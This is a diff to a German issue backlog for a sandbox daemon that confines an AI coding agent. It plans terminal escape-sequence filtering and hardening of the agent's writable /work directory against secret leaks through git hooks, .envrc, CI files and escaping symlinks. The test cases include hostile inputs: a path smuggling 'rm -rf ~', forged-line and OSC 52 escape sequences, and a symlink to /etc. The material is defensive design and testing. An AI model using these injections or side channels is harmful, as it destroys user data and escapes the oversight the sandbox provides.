+- „Genau ein aktiver Client pro Session, zweiter Aufruf `Status::already_exists`" widersprach dem eigenen Sprint-Kopf und CONVENTIONS 4.10: ein Schreiber, beliebig viele Leser, `TERM_001` nur beim zweiten Schreiber, als `diagnostic`.
+- Die Proto-Zeile beschrieb Nachrichten, die nie committet wurden (`Notice`, `detach`, `Exit.signal`); committet sind `Open{sandbox_id,cols,rows,read_only}`, `close`, `Exit{code}`, `Diagnostic`, `Resize` (beide Richtungen). `protoc-gen-dart` liegt hier nicht auf dem PATH; eine Proto-Änderung ließe `proto/generated.sha256` veralten und CI rot werden.
+- `resize` per `TIOCSWINSZ` plus `SIGWINCH` an `child: Pid` erreicht den Agenten nicht: `--new-session` ist unbedingt (`bwrap_args.rs`, `profile.rs`), kein steuerndes Terminal, und die bwrap-PID ist das Init des Namensraums. Es gilt `tcsetwinsize` plus `kill_process_group(…, WINCH)`.
+- `nix::pty::openpty` mit `fork`/`setsid`/`TIOCSCTTY`/`dup2` verlangt `unsafe` in einer Crate mit `#![forbid(unsafe_code)]`; `nix` ist in keinem Manifest. Es gilt `rustix` mit `pty`/`termios`, und die Deskriptoren kommen über `Stdio::from(OwnedFd)`.
+- `PtySession::spawn` als zweiter Starter neben `SandboxBackend::launch` verlöre Report-Pipe, `--json-status-fd`, `kill`/`interrupt`/`terminate` und damit die Isolationsprüfung von HUM-041; außerdem ist `LaunchPlan` von außen nicht baubar. PTY ist ein `StdioMode`.
+- Weiter korrigiert: kein `mpsc` vom Proxy (Bus existiert; Richtung wäre verboten); `[humanitl] request held` als nackte Zeile ist in einem Vollbild-TUI nicht sichtbar, deshalb der Streifen; `ui.terminal_notices` braucht `UiConfig` und `docs/CONFIG.md`; ARB-Schlüssel camelCase; `HTokens.terminalTheme` und ein Kontextmenü existieren nicht; ESC-5 schreibt die OSC-Fälle HUM-050 zu; „Der Daemon filtert, nicht die UI" ändert K-09 und braucht `docs/THREAT-MODEL.md` im selben Commit; Resize-Ordnung läuft über `Open`; `detach` bedeutete in HUM-067 das Gegenteil (dort jetzt gestrichen); der PTY-Test kann `LaunchPlan` nicht bauen; kein CLI-Subkommando genannt.
+
+**Offen, hier nicht entschieden:** `--new-session` behalten (Empfehlung) oder nicht; `HContextMenu` in diesem Issue oder in dem, das es für HUM-030 liefert; die `rustix`-Versionszeile in `[workspace.dependencies]` (Elternagent). `docs/THREAT-MODEL.md:330` sagt heute „Das Terminal-Widget (`xterm2`) hat OSC 52, OSC 8 und das Setzen des Fenstertitels abgeschaltet"; das bleibt wahr und wird um den Daemon-Filter ergänzt, nicht ersetzt.
+
+**Seit dem Audit überholt:** HUM-040 ist gemerged (`7fcafd0`); `sandbox_screen.dart`, `sandbox_status_provider.dart`, `domain/sandbox.dart` sind da, der Terminal-Bereich ist ein erklärter Platzhalter mit fester Aufteilung 60/40 (CONVENTIONS 4.17). Zeilenanker in der Proto sind um etwa 13 Zeilen gewandert (Terminal-Nachrichten heute ab Zeile 911).
+
+**Aus dem Audit nicht bestätigt:** die Zeilenangabe `handle.rs:394-399` für den Kommentar zur Signalzustellung an das Namespace-Init (der Aufruf `kill_process_group(pid, Signal::INT)` in `interrupt` ist da, den Kommentartext hat die Suche nicht getroffen); die Aussage über `bwrap 0.12.0` auf dieser Maschine wurde nicht nachgemessen.
+
+**Feindliche Eingabe:** drei Stellen. Erstens die Terminalbytes selbst (K-09): Filter im Daemon, kein OSC-Handler im Widget, Banner, Ringpuffer nur gefiltert. Zweitens, neu mit diesem Issue und die schärfste: die Hinweiszeile setzt Text des Agenten (`path_and_query`, roh) in eine Zeile mit Humanitl-Absender, und der Daemon schreibt sie selbst, also am Filter vorbei — ohne `sanitize_note`, Kürzung und Grenzeinfügung kann ein Pfad mit `\r`, `\x1b[2K` oder einem verschachtelten OSC 52 die echte Zeile löschen, `[humanitl] allowed` fälschen oder die Zwischenablage durch den Filter schieben, der es verhindern sollte. Drittens die Lesergrenze: `data` eines `read_only`-Clients wird im Handler verworfen, nicht im Client, und ist getestet (`reader_cannot_write`, `reader_resize_ignored`).
 
 ### Fallstricke
-- **Resize-Race:** Wenn Resize nach dem ersten Datenblock kommt, rendert der Agent einmal mit 80×24. Deshalb Resize vor Scrollback und im Client vor dem Öffnen des Streams die aktuelle Größe ermitteln.
+- **`--new-session` und Signale:** kein steuerndes Terminal, also kein automatisches `SIGWINCH` und kein tty-`SIGINT`. Resize liefert der Daemon per `kill_process_group`, Ctrl+C ist Byte 0x03.
+- **Resize-Race:** Geometrie kommt mit `Open` und wird vor dem Scrollback angewendet; im Client vor dem Öffnen des Streams die aktuelle Größe ermitteln.
 - Der OSC-Filter darf UTF-8-Mehrbytezeichen nicht zerschneiden: er arbeitet auf Bytes und gibt nur ganze Sequenzen oder Rohbytes weiter; UTF-8-Dekodierung passiert erst in Flutter mit `allowMalformed`.
 - `ESC \` (ST) besteht aus zwei Bytes, die über eine Chunk-Grenze fallen können. Der Zustandsautomat merkt sich das `ESC`.
-- PTY-Master `read` liefert `EIO`, wenn das Kind beendet ist; das ist EOF, kein Fehler.
-- Zombie-Vermeidung: `waitpid` im Daemon-Task, `SIGCHLD` nicht global ignorieren.
+- PTY-Master `read` liefert `EIO`, wenn das Kind beendet ist; das ist EOF, kein Fehler. Die eigene Kopie des Slaves nach dem Spawn schließen, sonst kommt das EOF nie.
+- `Shared::verdict` liest `SANDBOX_003` aus aufgefangenem stderr; im PTY-Modus ist `capturing` falsch, deshalb der 2-KiB-Spiegel.
+- Zombie-Vermeidung: `waitpid` bleibt in `supervise`, `SIGCHLD` nicht global ignorieren.
 - xterm2 unter Impeller: Text-Rendering testen, bei Problemen `--no-enable-impeller` dokumentieren (BACKLOG.md 10).
 
 ### Referenzen
-BACKLOG.md 4.2 (Terminal-Ausgabe), 4.5 ESC-5, Abschnitt 5; ADR-003; CONVENTIONS.md 3.6, 3.9. xterm2 (https://pub.dev/packages/xterm2), `pty(7)`, XTerm Control Sequences (OSC 52, OSC 8).
+BACKLOG.md 4.2 (Terminal-Ausgabe), 4.5 ESC-5, Abschnitt 5; ADR-003, ADR-018; CONVENTIONS.md 3.6, 3.9, 4.10, 4.12, 4.17; `docs/THREAT-MODEL.md` K-09; `docs/ARCHITECTURE.md` 1.2, 3b. xterm2 (https://pub.dev/packages/xterm2), `pty(7)`, XTerm Control Sequences (OSC 52, OSC 8), `rustix::pty`, `rustix::termios`.
 
 ---
 
 ## HUM-043 · `/work`-Härtung
-Sprint: 3 · Größe: M · Abhängigkeiten: HUM-011, HUM-025, HUM-026, HUM-040 · Blockiert: HUM-046
+Sprint: 3 · Größe: XL · Abhängigkeiten: HUM-011, HUM-025, HUM-026, HUM-040 · Blockiert: HUM-046, HUM-068 (Codes `SANDBOX_020..024`)
 
 ### Kontext
-Sicherheitsreview, Kanal 1: `/work` mit Schreibrecht ist der größte Seitenkanal. Der Agent kann Secrets in `.git/hooks`, `.envrc`, `.vscode/settings.json` oder Workflow-Dateien schreiben, die der Nutzer später ausführt oder pusht. Symlinks aus `/work` nach außen werden host-seitig aufgelöst. Der Kanal wird nicht geschlossen, sondern deklariert und beobachtet: Maskierung, Diff-Zusammenfassung am Session-Ende, Secret-Scan über den Diff, Symlink-Erkennung.
+Sicherheitsreview, Kanal 1: `/work` mit Schreibrecht ist der größte Seitenkanal. Der Agent kann Secrets in `.git/hooks`, `.envrc`, `.vscode/settings.json` oder Workflow-Dateien schreiben, die der Nutzer später ausführt oder pusht. Symlinks aus `/work` nach außen werden host-seitig aufgelöst. Der Kanal wird nicht geschlossen, sondern deklariert und beobachtet: Maskierung, Diff-Zusammenfassung am Ende des Sandbox-Laufs, Secret-Scan über den Diff, Symlink-Erkennung.
 
 ### Ziel
-Das Sandbox-Profil maskiert gefährliche Pfade in `/work`. Der Daemon nimmt beim Start einen Dateibaum-Snapshot (Pfad, Größe, mtime, Blake3 für Dateien ≤ 4 MiB) und beim Session-Ende einen zweiten, berechnet den Diff, scannt neue und geänderte Textdateien mit den Findings-Detektoren, erkennt Symlinks mit Ziel außerhalb `/work`, und liefert eine `SessionSummary`, die im UI als Sheet und in der CLI als Tabelle erscheint. Host-seitige Dateizugriffe des Daemons in `/work` verwenden `openat2` mit `RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS`.
+Das Sandbox-Profil maskiert gefährliche Pfade in `/work`. Der Daemon nimmt beim Start eines Sandbox-Laufs einen Dateibaum-Snapshot (Pfad, Größe, mtime, SHA-256 für Dateien ≤ 4 MiB) und beim Ende des Laufs einen zweiten, berechnet den Diff, scannt neue und geänderte Textdateien mit den Findings-Detektoren, erkennt Symlinks mit Ziel außerhalb `/work`, und liefert eine `SessionSummary`, die im UI als Sheet und in der CLI als Tabelle erscheint. Host-seitige Dateizugriffe des Daemons in `/work` verwenden `openat2` mit `RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS`.
 
 ### Nicht-Ziel
-Kein Git-Integration (kein `git diff`, keine Commits). Kein Blockieren von Schreibvorgängen zur Laufzeit (kein FUSE, kein inotify-basiertes Eingreifen). Keine Wiederherstellung.
+Kein Git-Integration (kein `git diff`, keine Commits). Kein Blockieren von Schreibvorgängen zur Laufzeit (kein FUSE, kein inotify-basiertes Eingreifen). Keine Wiederherstellung. Kein `blake3`: `humanitl_core::sha256` liefert schon `[u8; 32]`, `sha2` ist Workspace-Abhängigkeit, und `docs/ARCHITECTURE.md` 7 zählt die zugelassene Kryptographie ohne `blake3` auf.
 
 ### Betroffene Pfade
-- `profiles/sandbox/default.toml`: `tmpfs`, `masked_files` (bereits definiert in CONVENTIONS.md 3.4, hier vollständig)
-- `daemon/crates/sandbox/src/worktree.rs` (neu): Snapshot, Diff, Symlink-Check, Safe-Open
-- `daemon/crates/sandbox/src/summary.rs` (neu): `SessionSummary`
-- `daemon/crates/recorder/src/migrations/V3__session_summary.sql` (neu)
-- `proto/humanitl/v1/humanitl.proto`: `SessionSummary { repeated FileChange changes; repeated Finding findings; repeated SymlinkEscape symlinks; uint64 scanned_bytes; bool truncated }`
-- `app/lib/features/sandbox/widgets/session_summary_sheet.dart` (neu)
-- `daemon/bin/humanitl/src/cmd/flows.rs`: `humanitl sessions summary <id>` (neues Subkommando `sessions`, Ergänzung zu CONVENTIONS.md 3.8)
-- `tests/escape/esc-5-filesystem.sh`: Dateisystem-Teil
+Teil a, Maskierung und Profil:
+- `profiles/sandbox/default.toml`: `tmpfs`, `masked_files` ergänzen (Liste unten); danach `UPDATE_ARGV_SNAPSHOT=1 cargo test -p humanitl-sandbox --test bwrap_args_snapshot` und den Diff von `daemon/crates/sandbox/tests/snapshots/default.argv.txt` Zeile für Zeile lesen
+- `daemon/crates/sandbox/src/profile.rs`: `unmask` auf `MountSection` (`deny_unknown_fields`), wirkt in `effective_masked_files` nie auf `MANDATORY_MASKED_FILES`
+- `daemon/crates/core-types/src/diagnostics/codes.rs`: `SANDBOX_020..024` ans Ende anhängen (geteilte Datei: vor dem Schreiben neu lesen), danach `UPDATE_DIAG_DOCS=1 cargo test -p humanitl-core --test diag_docs`
+- `docs/SECURITY.md` (Zeilen zu `.envrc`/`.git/config` in Abschnitt 2 und im Kanal-Abschnitt): `--ro-bind-data` statt `/dev/null`, neue Liste; im selben Commit (CLAUDE.md)
+- `tests/escape/esc-5-filesystem.sh`: `symlink_out_of_work_is_marked`, `masked_path_stays_masked` von `skip` auf echte Prüfung, dritter Fall `hooks_write_stays_in_sandbox`; die übrigen vier bleiben `skip` (HUM-042 für die OSC-Fälle, HUM-029 für Audit). HUM-042 bearbeitet dieselbe Datei.
+
+Teil b, Snapshot, Summary, RPC, CLI, UI:
+- `daemon/crates/sandbox/src/worktree.rs` (neu): Snapshot, Diff, Symlink-Check, Safe-Open; nur `humanitl-core` und `humanitl-config` (`tools/deps-allow.toml`)
+- `daemon/crates/findings/src/registry.rs`: `DetectorRegistry::scan_bytes(&self, location: FindingLocation, bytes: &[u8]) -> ScanReport` (heute nur `scan(&HttpRequest, &[u8])`), `WorkflowDetector`
+- `daemon/crates/core-types/src/finding.rs`: `FindingLocation::File(PathBuf)`; nachziehen: Sortierschlüssel in `registry.rs`, Proto-Enum `FindingLocation` plus Pfad-Feld in `message Finding` (heute trägt nur `header_name` einen Parameter), Spaltenkommentar `findings.location` in `V1__init.sql`, `app/lib/core/domain/flow.dart`, `app/lib/core/ipc/convert.dart`
+- `daemon/crates/ipc/src/sandbox.rs`, `daemon/crates/ipc/src/summary.rs` (neu): Orchestrierung (Snapshot vor `launch`, Wach-Task auf den `SandboxHandle`, zweiter Snapshot, Scan, Summary in den Recorder, Ereignis); `daemon/crates/ipc/Cargo.toml` bekommt `humanitl-findings` (erlaubt, aber nicht eingetragen)
+- `daemon/crates/recorder/migrations/V5__session_summary.sql` (neu), Eintrag hinter V4 in `daemon/crates/recorder/src/schema.rs` (`migrations_are_numbered_without_gaps` erzwingt `version == index + 1`), Schreib- und Lesepfad
+- `proto/humanitl/v1/humanitl.proto`: `SessionSummary { repeated FileChange changes; repeated Finding findings; repeated SymlinkEscape symlinks; uint64 scanned_bytes; bool truncated }`, `FileChange`, `SymlinkEscape`, sechster Arm `SessionSummary summary = 6;` in `SandboxEvent.event`, `rpc GetSessionSummary(SessionRef) returns (SessionSummary)`; `scripts/gen-proto.sh`, `proto/generated.sha256`
+- `daemon/bin/humanitl/src/cli.rs`: `Cmd::Sessions`; `daemon/bin/humanitl/src/cmd/sessions.rs` (neu): `humanitl sessions summary <id> [--json]` (nicht `cmd/flows.rs`; Ergänzung zu CONVENTIONS 3.8)
+- `app/lib/features/sandbox/widgets/session_summary_sheet.dart` (neu), auf `h_sheet.dart` nach dem Vorbild `argv_sheet.dart`; `app/l10n/app_en.arb`, `app_de.arb`
 
 ### Spezifikation
 
-Maskierungsliste (Profil `default.toml`, vollständig):
+Maskierungsliste (Profil `default.toml`; heute stehen dort `tmpfs = ["/tmp", "/var/tmp", "/dev/shm", "/home/agent", "/work/.git/hooks", "/work/.vscode", "/work/.idea"]` und `masked_files = ["/work/.envrc", "/work/.git/config"]`, alles davon bleibt):
 
 ```toml
 [mounts]
 tmpfs = [
-  "/tmp", "/dev/shm", "/home/agent",
+  "/tmp", "/var/tmp", "/dev/shm", "/home/agent",
   "/work/.git/hooks",
   "/work/.vscode", "/work/.idea", "/work/.fleet",
   "/work/.github/workflows",
   "/work/.gitlab-ci.yml.d",
+  "/work/.direnv",
+  "/work/.humanitl",
 ]
 masked_files = [
   "/work/.envrc", "/work/.env", "/work/.env.local",
   "/work/.git/config",
   "/work/.npmrc", "/work/.yarnrc", "/work/.yarnrc.yml", "/work/.pypirc",
   "/work/.gitlab-ci.yml", "/work/Jenkinsfile", "/work/.pre-commit-config.yaml",
-  "/work/.direnv",
 ]
 ```
 
-`masked_files` werden als leere Datei (`--ro-bind /dev/null DST`) über den Originalpfad gelegt, nur wenn der Pfad existiert oder das Elternverzeichnis existiert (bwrap legt Zielpfad als Datei an). `tmpfs`-Pfade werden nur gemountet, wenn das Elternverzeichnis existiert; sonst übersprungen. Das Profil ist die einzige Quelle; der Nutzer kann global (nicht per Projekt, siehe HUM-066) `masked_files` erweitern oder mit `unmask = ["/work/.env"]` einzelne Pfade freigeben (Tier `expert`, Diagnostic `SANDBOX_020` Warning beim Start: "You unmasked {path}. The agent can read and write it.").
+`/var/tmp` fehlte in der „vollständigen" Liste der ersten Fassung und wäre wörtlich übernommen verloren gegangen. `/work/.humanitl` verlangt `backlog/sprint-4.md` (HUM-069, Test `sandbox_masks_dot_humanitl`): sonst schreibt der Agent sein eigenes Projekt-Profil. `.direnv` ist ein Verzeichnis und gehört nach `tmpfs`; eine Maske greift nur auf `is_file()`.
 
-Snapshot:
+`masked_files` werden als versiegeltes, leeres memfd per `--ro-bind-data` über den Originalpfad gelegt (`bwrap_args.rs`; nicht `/dev/null`: der Bind eines Gerätes auf einem `nodev`-Mount antwortet `EACCES`). Maske und `tmpfs` werden nur gerendert, wenn der Pfad selbst existiert (`BwrapBackend::present_under_work`: `is_file()` für Masken, `is_dir()` für tmpfs), nicht schon, wenn das Elternverzeichnis existiert — bwrap legt fehlende Mountpoints an, auf `rw` entstünde ein leeres `.idea/` im Projekt des Nutzers, auf `ro` scheitert der Start mit `EROFS`. **Die Lücke, die daraus folgt, entscheidet dieses Issue:** Ohne `.git/hooks` auf dem Host gibt es kein tmpfs, und der `pre-commit` des Agenten landet auf dem Host. Zwei Wege stehen zur Wahl, einer ist zu nehmen und hier einzutragen: der Daemon legt die Verzeichnisse vor dem Start ausdrücklich an (nur bei `work_mode = rw`, protokolliert), oder die Summary meldet die ungeschützten Pfade als Befund.
+
+`/work/.envrc` und `/work/.git/config` sind `MANDATORY_MASKED_FILES` (`profile.rs`, Test `masked_files_always_include_the_mandatory_ones`). `unmask` wirkt nie auf sie; ein Versuch ist `CONFIG_003`. Sonst fiele eine deklarierte Seitenkanal-Sperre (AGENTS.md, Kanal 1). Wo `unmask` wohnt, ist zu entscheiden: als Profilschlüssel `mounts.unmask` (dann kein Tier; Tiers sind Anmerkungen am Konfigurationsschema, nicht am Sandbox-Profil) oder als Konfigurationsschlüssel `sandbox.unmask` mit `x-tier = "expert"` und `x-project-scope = "denied"` (dann entsteht die Kommandozeilen-Fahne von selbst und `docs/CONFIG.md` wächst mit). Diagnostic `SANDBOX_020` (Warning) beim Start: "You unmasked {path}. The agent can read and write it."
+
+Snapshot (`worktree.rs`):
 
 ```rust
-pub struct TreeSnapshot { entries: BTreeMap<RelPath, Entry>, truncated: bool }
-pub struct Entry { kind: Kind /* File|Dir|Symlink{target}|Other */, size: u64, mtime_ns: i128, hash: Option<[u8;32]> }
+pub struct TreeSnapshot { entries: BTreeMap<PathBuf, Entry>, truncated: bool }   // Pfade relativ zu /work
+pub struct Entry { kind: Kind /* File|Dir|Symlink{target}|Other */, size: u64, mtime_ns: i128, mode: u32, hash: Option<[u8;32]> }
 pub fn snapshot(root: &Path, limits: &SnapshotLimits) -> Result<TreeSnapshot, Diagnostic>;
-pub struct SnapshotLimits { pub max_entries: usize /* 200_000 */, pub hash_max_bytes: u64 /* 4 MiB */, pub skip_dirs: Vec<&'static str> /* node_modules, .git/objects, target, .venv, __pycache__, .cache */ }
+pub struct SnapshotLimits {
+    pub max_entries: usize,                 /* 200_000 */
+    pub hash_max_bytes: u64,                /* 4 MiB */
+    pub skip_names: Vec<&'static str>,      /* node_modules, target, .venv, __pycache__, .cache */
+    pub skip_paths: Vec<&'static str>,      /* .git/objects */
+}
 pub fn diff(before: &TreeSnapshot, after: &TreeSnapshot) -> Vec<FileChange>;
-pub enum FileChange { Added(RelPath), Modified(RelPath), Removed(RelPath), SymlinkAdded { path: RelPath, target: PathBuf, escapes: bool }, ModeChanged(RelPath) }
+pub enum FileChange { Added(PathBuf), Modified(PathBuf), Removed(PathBuf), SymlinkAdded { path: PathBuf, target: PathBuf, escapes: bool }, ModeChanged(PathBuf) }
 ```
 
-Der Walk verwendet `openat2(dirfd, name, OpenHow { flags: O_PATH|O_NOFOLLOW|O_CLOEXEC, resolve: RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS|RESOLVE_NO_MAGICLINKS })` relativ zum Root-FD von `/work` (Host-Pfad). Symlinks werden per `readlinkat` gelesen, nie gefolgt. `escapes = true`, wenn `target` absolut ist oder nach lexikalischer Normalisierung mit `..` aus `/work` hinausführt. Kernel < 5.6 (kein `openat2`): Fallback `openat` mit `O_NOFOLLOW` pro Komponente, Diagnostic `SANDBOX_021` (Info): "Kernel without openat2; using slower path-by-path resolution."
+`mode` steht in `Entry`, sonst wäre `ModeChanged` nicht berechenbar. Zwei Listen statt einer: eine Liste bloßer Namen kann `.git/objects` nicht ausdrücken, ohne jedes `objects/` im Baum zu überspringen. `RelPath` gibt es im Baum nicht; `PathBuf` relativ zum Root. Hash ist `humanitl_core::sha256` (`http.rs`).
 
-`.git/objects` wird übersprungen (groß, opak), `.git/HEAD`, `.git/refs/**`, `.git/config` (maskiert, also unverändert), `.git/hooks` (tmpfs, also unverändert) werden erfasst.
+Der Walk verwendet `rustix::fs::openat2(dirfd, name, OFlags::PATH | OFlags::NOFOLLOW | OFlags::CLOEXEC, Mode::empty(), ResolveFlags::BENEATH | ResolveFlags::NO_SYMLINKS | ResolveFlags::NO_MAGICLINKS)` relativ zum Root-FD von `/work` (Host-Pfad); `rustix = { version = "1.1", features = ["fs", "process"] }` ist schon direkte Abhängigkeit der Crate, `nix` nicht im Baum. Symlinks werden per `readlinkat` gelesen, nie gefolgt. `escapes = true`, wenn `target` absolut ist oder nach lexikalischer Normalisierung mit `..` aus `/work` hinausführt; das Ziel wird dafür nie aufgelöst. Kernel < 5.6 (kein `openat2`, `Errno::NOSYS`): Fallback `openat` mit `O_NOFOLLOW` je Komponente, Diagnostic `SANDBOX_021` (Info). Merken: `openat2` hängt in rustix an `linux_raw`; wer `use-libc` einschaltet, verliert es.
 
-Scan: Für `Added`/`Modified` Dateien ≤ 4 MiB, deren erste 8 KiB kein NUL-Byte enthalten (Text-Heuristik), laufen die Findings-Detektoren (HUM-025) mit `FindingLocation::File(path)` (neue Variante). Zusätzlicher Detektor `WorkflowDetector`: Pfad matcht `.github/workflows/**`, `.gitlab-ci.yml`, `Makefile`, `package.json` (nur Schlüssel `scripts.postinstall|preinstall|prepare`), `setup.py`, `pyproject.toml` (`[tool.*.scripts]`), `Cargo.toml` (`build`) ⇒ `FindingKind::Custom("executable-on-host")`, Tier `Regex`. Diese Findings werden nicht geblockt, sondern gelistet.
+`.git/objects` wird übersprungen (groß, opak), `.git/HEAD`, `.git/refs/**`, `.git/config` (maskiert, also unverändert), `.git/hooks` (tmpfs, also unverändert) werden erfasst. Budgets nach dem Muster von `SOCKET_WALK_MAX_ENTRIES` (`profile.rs`): Symlink-Schleifen und tiefe Bäume enden im `truncated`-Flag mit `SANDBOX_024`, nie in einem hängenden Daemon.
 
-`SessionSummary` wird im Recorder in Tabelle `session_summaries(session_id PK, created, json BLOB)` gespeichert und per `Sandbox(Status)`-Event `SessionEnded { summary }` an die UI gestreamt. UI: Sheet von rechts, Titel „Session summary", drei Abschnitte: Changed files (Tabelle Pfad, Art, Größe), Findings (Chips nach Typ, Klick zeigt Datei und Zeile), Symlinks (rot, wenn `escapes`). Buttons: „Open folder" (`xdg-open` host-seitig auf `/work`-Hostpfad), „Copy list". CLI: `humanitl sessions summary <id> [--json]`.
+Scan: Für `Added`/`Modified` Dateien ≤ 4 MiB, deren erste 8 KiB kein NUL-Byte enthalten (Text-Heuristik), läuft `DetectorRegistry::scan_bytes(FindingLocation::File(path), bytes)`. Zusätzlicher Detektor `WorkflowDetector` (`Detector`-Trait in `registry.rs`, nur Pfadmuster, kein IO): Pfad matcht `.github/workflows/**`, `.gitlab-ci.yml`, `Makefile`, `package.json` (nur Schlüssel `scripts.postinstall|preinstall|prepare`), `setup.py`, `pyproject.toml` (`[tool.*.scripts]`), `Cargo.toml` (`build`) ⇒ `FindingKind::Custom("executable-on-host")`, Tier `Regex`. Diese Findings werden nicht geblockt, sondern gelistet. Die Zeile eines Fundes rechnet der Daemon (`\n` bis `span.start`; `Finding.span` ist ein Byte-Bereich) und legt sie als `line: u32` in die Summary; die Oberfläche hat die Datei nicht.
 
-Diagnostics: `SANDBOX_022` (Warning) pro Symlink mit `escapes`: "The agent created a symlink {path} pointing outside the project ({target}). Do not follow it." `fix: CopyCommand("rm '{host_path}'")`. `SANDBOX_023` (Warning) bei Findings in geänderten Dateien: "{n} potential secret(s) were written into the project during this session." `SANDBOX_024` (Info) bei `truncated`.
+`SessionSummary` gehört zum **Sandbox-Lauf**, nicht zur Daemon-Sitzung: `humanitld` hat genau eine `SessionId` je Prozess (`main.rs`, `start_session` beim Start, `end_session` beim Herunterfahren), die Sandbox startet und stoppt darin beliebig oft (`SandboxService::start`/`stop`), und `/work` steht erst mit `SandboxRequest.Start.work_dir` fest. Tabelle `session_summaries(session_id, run_id, created, json BLOB, PRIMARY KEY(session_id, run_id))` mit einer eigenen Lauf-Kennung, die dieses Issue einführt. „Session-Ende" heißt überall in diesem Issue „`SandboxHandle` beendet". Ein Wach-Task in `SandboxService` wartet auf das Handle, zieht den zweiten Snapshot und sendet `SandboxEvent.summary` — heute bemerkt der Dienst das Ende des Agenten nur, wenn ein Client nach dem Status fragt (`try_wait()` in `running_facts`). Der RPC `GetSessionSummary` liefert eine gespeicherte Summary nach Kennung; kein vorhandener RPC kann das, und `Sandbox` ist ein Strom über die laufende Sandbox.
+
+UI: Sheet von rechts, Titel „Session summary", drei Abschnitte: Changed files (Tabelle Pfad, Art, Größe), Findings (Chips nach Typ, Klick zeigt Datei und Zeile aus der Summary), Symlinks (rot, wenn `escapes`). Buttons: „Open folder" über `org.freedesktop.FileManager1.ShowFolders` per vorhandener `dbus`-Abhängigkeit (kein `url_launcher`, kein `Process.run` in `app/lib`) auf den Host-Pfad aus `sandbox.work_dir`, nie auf einen Pfad aus der Summary; „Copy list". CLI: `humanitl sessions summary <id> [--json]`; jeder Pfad und jedes Symlink-Ziel läuft vor Tabelle, Diagnostic und JSON durch `humanitl_core::block::sanitize_note` (`render.rs::one_line` lässt ESC, OSC und Bidi stehen).
+
+Diagnostics (`SANDBOX_020..024`, Bereich reicht bis 029, höchster vergebener Code ist `SANDBOX_016`): `SANDBOX_022` (Warning) pro Symlink mit `escapes`: "The agent created a symlink {path} pointing outside the project ({target}). Do not follow it." `fix: CopyCommand(…)` nur, wenn `shlex::try_quote` den Host-Pfad verlustfrei quotieren kann, sonst kein `CopyCommand`, nur Anzeige — es wäre der erste `CopyCommand` im Baum aus fremden Bytes, und ein Pfad mit `'` bricht aus der Quotierung aus. `SANDBOX_023` (Warning) bei Findings in geänderten Dateien: "{n} potential secret(s) were written into the project during this session." `SANDBOX_024` (Info) bei `truncated`.
 
 ### Schritte
-1. Profil-Liste vervollständigen, Launcher: `masked_files` als `/dev/null`-Bind, Existenzprüfung, `unmask`.
-2. `worktree.rs`: Safe-Open-Helper mit `openat2` (Crate `rustix` oder `nix` ≥ 0.29), Fallback, Snapshot, Diff. Tests mit `tempfile`-Bäumen.
-3. `FindingLocation::File`, `WorkflowDetector`.
-4. `summary.rs`, Recorder-Migration, Event, CLI-Kommando.
-5. Flutter-Sheet.
-6. `esc-5-filesystem.sh` Dateisystem-Teil: Symlink `/work/x -> /home`, Datei in `.git/hooks/pre-commit`, `.envrc` schreiben ⇒ Summary listet Symlink mit `escapes`, Hook-Datei existiert auf dem Host nicht, `.envrc` auf dem Host unverändert.
+1. Teil a: Profil-Liste ergänzen, Argv-Snapshot erneuern und lesen; `unmask` mit `CONFIG_003`-Sperre für Pflichtmasken; die Existenzlücke (`.git/hooks` fehlt) entscheiden und umsetzen; `SANDBOX_020..024` registrieren; `docs/SECURITY.md` nachziehen; ESC-5-Fälle. Eigener Commit.
+2. Teil b: `worktree.rs` mit `openat2`, Fallback, Snapshot, Diff, Budgets; tabellengetriebene Tests mit `tempfile`.
+3. `FindingLocation::File`, `scan_bytes`, `WorkflowDetector`, die fünf abhängigen Stellen.
+4. Lauf-Kennung, Wach-Task, `summary.rs`, Migration V5, Proto (sechster Arm, drei Nachrichten, RPC), Codegen.
+5. `Cmd::Sessions`, `cmd/sessions.rs`.
+6. Flutter-Sheet, ARB (geteilte Dateien: neu lesen, anhängen).
 
 ### Tests
 - `snapshot_skips_node_modules_and_git_objects`.
-- `diff_detects_added_modified_removed`.
+- `diff_detects_added_modified_removed`, `diff_detects_mode_change`.
 - `symlink_escape_absolute`, `symlink_escape_dotdot`, `symlink_inside_ok`.
 - `openat2_refuses_symlink_traversal`: Baum mit `a -> /etc`; Öffnen von `a/passwd` schlägt mit `EXDEV`/`ELOOP` fehl.
 - `masked_envrc_is_empty_in_sandbox`, `hooks_dir_is_tmpfs`: Integration mit bwrap.
-- `findings_in_added_file`: neue Datei mit `AKIA...`-Muster ⇒ `SANDBOX_023`.
+- `unmask_never_touches_mandatory_masks` neben `masked_files_always_include_the_mandatory_ones`.
+- `findings_in_added_file`: neue Datei mit `AKIA...`-Muster (zur Laufzeit aus zwei Teilen zusammengesetzt, CONVENTIONS 4.13) ⇒ `SANDBOX_023`.
 - `workflow_detector_flags_github_workflow`.
+- `copy_command_is_shell_safe`: Pfad `a'; rm -rf ~; '` ergibt keinen `CopyCommand`.
+- Benchmark mit `#[ignore]` nach dem Vorbild `daemon/crates/recorder/tests/list_flows_scale.rs`.
 
 ### Akzeptanzkriterien
-- [ ] ESC-5 Dateisystem-Teil grün.
-- [ ] Nach einer Session, in der der Agent `echo x > .env` ausführt, ist `.env` auf dem Host unverändert und die Summary zeigt keinen Eintrag für `.env` (weil maskiert), aber `SANDBOX_020` erscheint, falls `unmask` gesetzt war.
-- [ ] Summary-Sheet erscheint automatisch beim Session-Ende, Findings-Chips sind klickbar.
-- [ ] `humanitl sessions summary <id> --json` liefert `changes`, `findings`, `symlinks`.
+- [ ] ESC-5: `symlink_out_of_work_is_marked`, `masked_path_stays_masked`, `hooks_write_stays_in_sandbox` grün; die vier fremden Fälle bleiben `skip`.
+- [ ] Nach einem Lauf, in dem der Agent `echo x > .env` ausführt, ist `.env` auf dem Host unverändert und die Summary zeigt keinen Eintrag für `.env` (weil maskiert), aber `SANDBOX_020` erscheint, falls `unmask` gesetzt war.
+- [ ] Summary-Sheet erscheint automatisch, wenn der `SandboxHandle` endet, ohne dass ein Client nach dem Status fragt; Findings-Chips sind klickbar.
+- [ ] `humanitl sessions summary <id> --json` liefert `changes`, `findings`, `symlinks`; ein Symlink-Ziel mit `ESC ]` erscheint gesäubert.
 - [ ] Snapshot eines Projekts mit 50 000 Dateien dauert unter 5 s (Benchmark-Test, `#[ignore]`).
 
